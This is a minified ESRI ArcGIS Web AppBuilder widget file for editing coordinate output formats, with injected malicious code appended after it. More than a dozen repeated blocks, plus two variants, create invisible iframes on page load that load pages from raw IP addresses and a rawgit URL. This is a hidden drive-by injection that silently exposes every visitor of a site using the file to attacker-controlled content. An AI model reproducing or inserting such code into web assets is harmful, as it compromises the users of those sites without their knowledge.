// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/CoordinateConversion/EditOutputCoordinate.html":'\x3cdiv\x3e\r\n    \x3cspan class\x3d\'formatText\'\x3e${nls.editCoordinateDialogTitle}\x3c/span\x3e\r\n    \x3cdiv class\x3d"controlContainer"\x3e\r\n        \x3cselect tabindex\x3d1 class\x3d"selectFormat" name\x3d"test" data-dojo-attach-point\x3d"frmtSelect"\x3e\r\n            \x3coption value\x3d"DD"\x3e${nls.DD}\x3c/option\x3e\r\n            \x3coption value\x3d"DDM"\x3e${nls.DDM}\x3c/option\x3e\r\n            \x3coption value\x3d"DMS"\x3e${nls.DMS}\x3c/option\x3e\r\n            \x3coption value\x3d"GARS"\x3e${nls.GARS}\x3c/option\x3e\r\n            \x3coption value\x3d"GEOREF"\x3e${nls.GEOREF}\x3c/option\x3e\r\n            \x3coption value\x3d"MGRS"\x3e${nls.MGRS}\x3c/option\x3e\r\n            \x3coption value\x3d"USNG"\x3e${nls.USNG}\x3c/option\x3e\r\n            \x3coption value\x3d"UTM"\x3e${nls.UTM}\x3c/option\x3e\r\n            \x3coption value\x3d"UTM (H)"\x3e${nls.UTM_H}\x3c/option\x3e\r\n        \x3c/select\x3e\r\n\r\n        \x3cinput tabindex\x3d2 type \x3d"text" data-dojo-attach-point\x3d"frmtVal" class\x3d"formatInput"\x3e\x3c/input\x3e\r\n        \r\n        \x3cdiv class\x3d\'settingsContainer\' data-dojo-attach-point\x3d"prefixContainer"\x3e\r\n            \x3c!--\x3cdiv data-dojo-attach-point\x3d\'addDirChkBox\' data-dojo-props\x3d\'checked:true\' data-dojo-type\x3d\'jimu/dijit/CheckBox\'\x3eAdd "N,S,E,W" suffix based on latitude/longitude\x3c/div\x3e--\x3e\r\n            \x3cinput data-dojo-attach-point\x3d\'addSignChkBox\' type\x3d"checkbox" /\x3e\r\n            \x3clabel class\x3d"formatText"\x3e${nls.posNegPrefixLabel}\x3c/label\x3e\r\n        \x3c/div\x3e\r\n\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"btnContainer"\x3e\r\n        \x3cdiv tabindex\x3d3 data-dojo-attach-point\x3d"applyButton" class\x3d\'jimu-btn\'\x3e${nls.applyButtonLabel}\x3c/div\x3e\r\n        \x3cdiv tabindex\x3d4 data-dojo-attach-point\x3d"cancelButton" class\x3d\'jimu-btn\'\x3e${nls.cancelButtonLabel}\x3c/div\x3e\r\n    \x3c/div\x3e\r\n\x3c/div\x3e\r\n'}});
define("dojo/_base/declare dojo/_base/lang dojo/dom-style dojo/on dojo/dom-attr dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./EditOutputCoordinate.html dijit/form/Select jimu/dijit/CheckBox".split(" "),function(f,a,e,c,d,g,h,k,l){return f([g,h,k],{templateString:l,isCanceled:!1,formats:{},setCt:function(b){this.ct=b;d.set(this.frmtSelect,"value",this.ct)},postCreate:function(){this.formats={DD:{defaultFormat:"YN XE",customFormat:null,useCustom:!1},DDM:{defaultFormat:"A\u00b0 B'N X\u00b0 Y'E",
customFormat:null,useCustom:!1},DMS:{defaultFormat:"A\u00b0 B' C\"N X\u00b0 Y' Z\"E",customFormat:null,useCustom:!1},GARS:{defaultFormat:"XYQK",customFormat:null,useCustom:!1},GEOREF:{defaultFormat:"ABCDXY",customFormat:null,useCustom:!1},MGRS:{defaultFormat:"ZSXY",customFormat:null,useCustom:!1},USNG:{defaultFormat:"ZSXY",customFormat:null,useCustom:!1},UTM:{defaultFormat:"ZB X Y",customFormat:null,useCustom:!1},"UTM (H)":{defaultFormat:"ZH X Y",customFormat:null,useCustom:!1}};d.set(this.frmtVal,
"value",this.formats[this.ct].defaultFormat);this.own(c(this.frmtSelect,"change",a.hitch(this,this.frmtSelectValueDidChange)));this.own(c(this.frmtVal,"change",a.hitch(this,this.formatValDidChange)));this.own(c(this.cancelButton,"click",a.hitch(this,function(){this.isCanceled=!0})));this.own(c(this.applyButton,"click",a.hitch(this,function(){this.isCanceled=!1})));this.displayPrefixContainer()},formatValDidChange:function(){var b=d.get(this.frmtVal,"value"),a=this.frmtSelect.options[this.frmtSelect.selectedIndex].value;
this.formats[a].customFormat=b;this.formats[a].useCustom=!0},frmtSelectValueDidChange:function(){var b=this.frmtSelect.options[this.frmtSelect.selectedIndex].value,a=this.formats[b].useCustom?this.formats[b].customFormat:this.formats[b].defaultFormat;this.ct=b;d.set(this.frmtVal,"value",a);this.displayPrefixContainer()},displayPrefixContainer:function(){switch(this.ct){case "DD":case "DDM":case "DMS":e.set(this.prefixContainer,{display:""});break;default:e.set(this.prefixContainer,{display:"none"})}}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});